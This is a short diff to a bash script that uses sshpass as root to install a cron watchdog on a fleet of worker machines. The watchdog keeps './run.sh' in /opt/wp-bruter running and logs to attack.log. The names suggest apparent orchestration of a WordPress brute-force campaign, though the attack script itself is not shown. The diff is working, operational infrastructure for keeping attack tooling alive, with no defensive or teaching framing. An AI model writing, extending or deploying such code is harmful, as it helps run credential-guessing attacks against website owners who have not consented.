@@ -8,8 +8,8 @@ for W in $(grep -Ev '^[[:space:]]*(#|$)' "${FLEET_FILE:-$HERE/fleet.txt}"); do
     printf '[%s] ' "$W"
     sshpass -p "$WORKER_PASS" ssh "${SSH_OPTS[@]}" "root@$W" '
         cd /opt/wp-bruter || exit 1
-        printf "%s\n" "*/3 * * * * cd /opt/wp-bruter && pgrep -f \"run[.]sh\" >/dev/null || PHASES=\"$PHASES\" nohup ./run.sh \$(cat shard.idx 2>/dev/null || echo 0) >> attack.log 2>&1" > /etc/cron.d/wp-bruter
+        printf "%s\n" "*/3 * * * * root cd /opt/wp-bruter && pgrep -f \"^/bin/bash ./run[.]sh\" >/dev/null || [ -f done ] || nohup ./run.sh \$(cat shard.idx 2>/dev/null || echo 0) >> attack.log 2>&1" > /etc/cron.d/wp-bruter
         chmod 644 /etc/cron.d/wp-bruter
-        pgrep -f "run[.]sh" >/dev/null && echo "watchdog ok (running)" || echo "watchdog ok (run.sh absent — cron will start it)"
+        if pgrep -f "^/bin/bash ./run[.]sh" >/dev/null; then echo "watchdog ok (running)"; elif [ -f done ]; then echo "watchdog ok (finished, cron idle)"; else echo "watchdog ok (run.sh absent — cron will start it)"; fi
     ' 2>/dev/null || echo "watchdog failed"
 done
